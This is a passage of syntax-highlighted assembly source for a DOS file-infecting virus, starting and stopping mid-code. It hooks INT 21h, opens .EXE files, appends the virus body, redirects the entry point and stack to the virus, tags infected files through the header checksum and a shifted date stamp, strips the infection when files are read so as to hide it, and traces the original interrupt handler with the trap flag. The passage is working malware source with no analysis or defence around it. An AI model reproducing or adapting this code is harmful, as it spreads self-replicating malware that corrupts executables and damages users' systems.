                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">File_Header</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF_Rel</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; Read the original header</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">  </span><span class="sc1">; located in the viruscode.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Seek to the original EOF.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF_Rel</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; Truncate file at current</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">              </span><span class="sc1">; position.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_BOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; Write the original header</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">  </span><span class="sc1">; back to the file.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">5701h</span><span class="sc0">                   </span><span class="sc1">; Restore original date.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">JMP_Old_Int21h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3501h</span><span class="sc0">               </span><span class="sc1">; Grab INT 01h's address.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Orig_Int_01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">        </span><span class="sc1">; Save it.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Orig_Int_01h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">                 </span><span class="sc1">; Install our own handler.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Tracer</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">           </span><span class="sc1">; Set the TF.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Restore original registers.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; JMP xxxx:xxxx opcode.</span><span class="sc0">
</span><span class="sc5">Orig_Int21h</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">               </span><span class="sc1">; Open the candidate file.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Read_Header</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Infect</span><span class="sc0">

</span><span class="sc5">Read_Header</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">File_Header</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; Read file's header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">JMP_Close_File</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Able to read it entirely?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Close_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.EXE_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Verify it's an .EXE-file.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Close_File</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Is it already infected?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">JMP_Close_File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; File is larger than 64k ?</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Save_Stamp</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0">                 </span><span class="sc1">; Must be atleast 666 bytes.</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Save_Stamp</span><span class="sc0">

</span><span class="sc5">JMP_Close_File</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">

</span><span class="sc5">Save_Stamp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Date</span><span class="sc0">              </span><span class="sc1">; Obtain it's date &amp; time.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Header_Size_PG</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate it's headersize</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; in bytes.</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; DI:BP = headersize.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Append virusbody to the</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; host.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                  </span><span class="sc1">; Calculate imagesize.</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; Calculate virus' CS:IP.</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Set new CS:IP.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_IP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Set new SS:SP.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_SP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_EOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Store_Pages</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">Store_Pages</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.File_512_Pages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">

</span><span class="sc5">Fix_Min_Mem</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Min_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Update MinMem requirements.</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Fix_Max_Mem</span><span class="sc0">             </span><span class="sc1">; Did it overflow?</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Min_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Then just use old value.</span><span class="sc0">

</span><span class="sc5">Fix_Max_Mem</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Max_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Update MaxMem requirements.</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Calc_Mod_512</span><span class="sc0">            </span><span class="sc1">; Did it overflow?</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Max_Size_Mem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Then just use old value.</span><span class="sc0">

</span><span class="sc5">Calc_Mod_512</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Image_Mod_512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_BOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Infection-tag.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; Write back updated header.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

</span><span class="sc5">Restore_Stamp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">5701h</span><span class="sc0">                   </span><span class="sc1">; Restore infected stamp.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close the file (duh).</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

</span><span class="sc5">Exit_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">JMP_Old_Int21h</span><span class="sc0">


</span><span class="sc5">Read_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Write_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

</span><span class="sc5">Seek_BOF</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Seek_EOF</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">

</span><span class="sc5">Z_CX_DX_Int21h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">

</span><span class="sc5">Do_Old_Int21h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Orig_Int21h</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Seek_EOF_Rel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">


</span><span class="sc5">Save_File_Pos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Z_CX_DX_Int21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_Low</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">File_Pos_High</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Restore_File_Pos</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Pos_High</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Pos_Low</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">


</span><span class="sc5">Check_Date</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Chk_Date</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Century</span><span class="sc0">

</span><span class="sc5">Exit_Chk_Date</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Set_Stack_Regs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Do_Real_Int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">                     </span><span class="sc1">; CALL xxxx:xxxx opcode.</span><span class="sc0">
</span><span class="sc5">Real_Int13h</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Swap_JMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Orig_Int21h</span><span class="sc0">
